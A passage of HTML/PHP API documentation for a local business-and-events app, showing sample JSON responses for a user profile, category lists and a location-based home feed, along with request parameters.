    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miralbhai"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">email</span>: <span class="type-string">"miralviroja4@gmail.com"</span>,</div></li><li><div class="hoverable"><span class="property">work_phone</span>: <span class="type-string">"787878787"</span>,</div></li><li><div class="hoverable"><span class="property">work_email</span>: <span class="type-string">"miral@amcodr.com"</span>,</div></li><li><div class="hoverable"><span class="property">phone</span>: <span class="type-string">"151515151"</span>,</div></li><li><div class="hoverable"><span class="property">address</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/apps/businessapp/uploads/user/14691723208605.png">http://localhost/apps/businessapp/uploads/user/14691723208605.png</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>}</div>
</div>

<h6>
    <i class="fa fa-hand-o-right"></i> Error (Some required data not posted)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">400</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"error"</span>,</div></li><li><div class="hoverable"><span class="property">message</span>: <span class="type-string">"Error in Posting"</span></div></li></ul>}</div>
</div>
</div>



<hr>


<div class="section" id="GetCategory">
    <h2>Category Lists
        <a class="headerlink" href="index.php#GetCategory" title="Permalink to this headline">¶</a>
        <a href="<?php echo $apipath.'category/get_categories';?>" target="_blank" class="html_link">Run Api</a>
    </h2>
    <p>Category Lists</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'category/get_categories';?></pre>
        </div>
    </div>
  
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
  <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Meetups"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/meetups.png">http://localhost/businessApp/uploads/category/meetups.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/business.png">http://localhost/businessApp/uploads/category/business.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"3"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Music"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/music.png">http://localhost/businessApp/uploads/category/music.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable hovered"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"4"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Dance"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/dance.png">http://localhost/businessApp/uploads/category/dance.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"5"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Workshop"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/workshop.png">http://localhost/businessApp/uploads/category/workshop.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"6"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Arts"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/arts.png">http://localhost/businessApp/uploads/category/arts.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"7"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Meetups"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/meetups.png">http://localhost/businessApp/uploads/category/meetups.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"8"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/business.png">http://localhost/businessApp/uploads/category/business.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"9"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Music"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/music.png">http://localhost/businessApp/uploads/category/music.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Dance"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/dance.png">http://localhost/businessApp/uploads/category/dance.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"11"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Workshop"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/workshop.png">http://localhost/businessApp/uploads/category/workshop.png</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"12"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Arts"</span>,</div></li><li><div class="hoverable"><span class="property">image</span>: <span class="type-string">"</span><a href="http://localhost/businessApp/uploads/category/arts.png">http://localhost/businessApp/uploads/category/arts.png</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>}</div>
</div>

</div>

<hr>

<div class="section" id="home">
    <h2>Home
        <a class="headerlink" href="index.php#home" title="Permalink to this headline">¶</a>
        <a href="<?php echo $formpath.'home.php'?>" target="_blank" class="html_link">HTML Form</a>
    </h2>
    <p>Home</p>
    <h5>API LINK</h5>
    <div class="highlight-text">
        <div class="highlight">
            <pre><?php echo $apipath.'business/home';?></pre>
        </div>
    </div>
    <h5>Request Parameters</h5>
    <div class="wy-table-responsive">
        <table border="1" class="docutils">
            <colgroup>
            <col width="35%">
            <col width="30%">
            <col width="">
        </colgroup>
        <thead valign="bottom">
            <tr class="row-odd">
                <th class="head">Param</th>
                <th class="head">Required/Optional</th>
                <th class="head">Description</th>
            </tr>
        </thead>
        <tbody valign="top">
            <tr class="row-even">
                <td>deLatitude</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>deLongitude</td>
                <td>Required</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>iRadius</td>
                <td>optional</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>Limit</td>
                <td>optional</td>
                <td></td>
            </tr>
             <tr class="row-even">
                <td>Offset</td>
                <td>optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>user_id</td>
                <td>required</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>DistanceType</td>
                <td>optional</td>
                <td>KM or mile</td>
            </tr>

            <tr class="row-even">
                <td>start_date</td>
                <td>optional</td>
                <td></td>
            </tr>
            <tr class="row-even">
                <td>end_date</td>
                <td>optional</td>
                <td></td>
            </tr>
            
        </tbody>
    </table>
</div>
<h5>Response</h5>
<h6>
    <i class="fa fa-hand-o-right"></i> Success (Profile)
</h6>
<div class="highlight-js json">
    <div id="json"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">code</span>: <span class="type-number">200</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"success"</span>,</div></li><li><div class="hoverable"><span class="property">offset</span>: <span class="type-string">"6,6"</span>,</div></li><li><div class="hoverable"><span class="property">data</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"event"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">title</span>: <span class="type-string">"Stark Expo1"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"21.693249275887162"</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/1.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/1.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"4"</span>,</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miralbhai"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/user/14691723208605.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/user/14691723208605.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">"5"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"1"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"renish"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"patel"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/1.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/1.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">rate</span>: <span class="type-string">"5"</span>,</div></li><li><div class="hoverable"><span class="property">is_share</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">is_favourite</span>: <span class="type-string">"1"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miralbhai"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/user/14691723208605.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/user/14691723208605.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">comment</span>: <span class="type-string">"this is nice event"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"9"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/user/14691720377171.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/user/14691720377171.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">comment</span>: <span class="type-string">"this is nice event"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">attendee</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"10"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miralbhai"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/user/14691723208605.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/user/14691723208605.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"1"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"4"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">status</span>: <span class="type-string">"1"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">images</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/1.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/1.jpg</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/4.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/4.jpg</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"event"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">title</span>: <span class="type-string">"BMW Expo2"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"limdi"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"111.43117397910554"</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/2.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/2.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">user_id</span>: <span class="type-string">"11"</span>,</div></li><li><div class="hoverable"><span class="property">first_name</span>: <span class="type-string">"Miral"</span>,</div></li><li><div class="hoverable"><span class="property">last_name</span>: <span class="type-string">"Viroja"</span>,</div></li><li><div class="hoverable"><span class="property">userImage</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/user/14691724451127.png" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/user/14691724451127.png</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">comment</span>: <span class="type-string">"this is nice event"</span></div></li></ul>}</div></li></ul>],</div></li><li><div class="hoverable"><span class="property">attendee</span>: [ ],</div></li><li><div class="hoverable"><span class="property">images</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/2.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/2.jpg</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"3"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"event"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">title</span>: <span class="type-string">"Stark Expo3"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"rajkot"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"212.78204287715442"</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/3.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/3.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">attendee</span>: [ ],</div></li><li><div class="hoverable"><span class="property">images</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/3.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/3.jpg</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"4"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"event"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">title</span>: <span class="type-string">"Stark Expo4"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"upleta"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"291.6479324857863"</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/4.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/4.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">attendee</span>: [ ],</div></li><li><div class="hoverable"><span class="property">images</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/4.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/4.jpg</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"5"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"event"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">title</span>: <span class="type-string">"Stark Expo5"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"kutiyana"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"324.2172363675114"</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/5.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/5.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">attendee</span>: [ ],</div></li><li><div class="hoverable"><span class="property">images</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/5.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/5.jpg</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"6"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"event"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">title</span>: <span class="type-string">"Stark Expo6"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"porbandar"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"354.29813267932985"</span>,</div></li><li><div class="hoverable"><span class="property">url</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/6.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/6.jpg</a><span class="type-string">"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"0"</span>,</div></li><li><div class="hoverable"><span class="property">LikedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">CommentedusersLists</span>: [ ],</div></li><li><div class="hoverable"><span class="property">attendee</span>: [ ],</div></li><li><div class="hoverable"><span class="property">images</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/6.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/6.jpg</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"1"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-1"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"Ahmedabad"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">"Mon-Sat  10AM-10PM"</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"1234567890"</span>,</div></li><li><div class="hoverable"><span class="property">distance</span>: <span class="type-string">"21.693249275887162"</span>,</div></li><li><div class="hoverable"><span class="property">totleLike</span>: <span class="type-string">"5"</span>,</div></li><li><div class="hoverable"><span class="property">images</span>: <div class="collapser"></div>[<span class="ellipsis"></span><ul class="array collapsible"><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/3.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/3.jpg</a><span class="type-string">"</span></div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">image_path</span>: <span class="type-string">"</span><a href="http://localhost:8888/test/businessApp/uploads/event/4.jpg" class="hoverZoomLink">http://localhost:8888/test/businessApp/uploads/event/4.jpg</a><span class="type-string">"</span></div></li></ul>}</div></li></ul>]</div></li></ul>},</div></li><li><div class="hoverable"><div class="collapser"></div>{<span class="ellipsis"></span><ul class="obj collapsible"><li><div class="hoverable"><span class="property">id</span>: <span class="type-string">"2"</span>,</div></li><li><div class="hoverable"><span class="property">type</span>: <span class="type-string">"business"</span>,</div></li><li><div class="hoverable"><span class="property">distance_type</span>: <span class="type-string">"mile"</span>,</div></li><li><div class="hoverable"><span class="property">name</span>: <span class="type-string">"Business-2"</span>,</div></li><li><div class="hoverable"><span class="property">description</span>: <span class="type-string">"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum"</span>,</div></li><li><div class="hoverable"><span class="property">location</span>: <span class="type-string">"Limdi"</span>,</div></li><li><div class="hoverable"><span class="property">working_hours</span>: <span class="type-string">""</span>,</div></li><li><div class="hoverable"><span class="property">mobile</span>: <span class="type-string">"4545454545"</span>,</div></li><li><div class="hoverable"><span 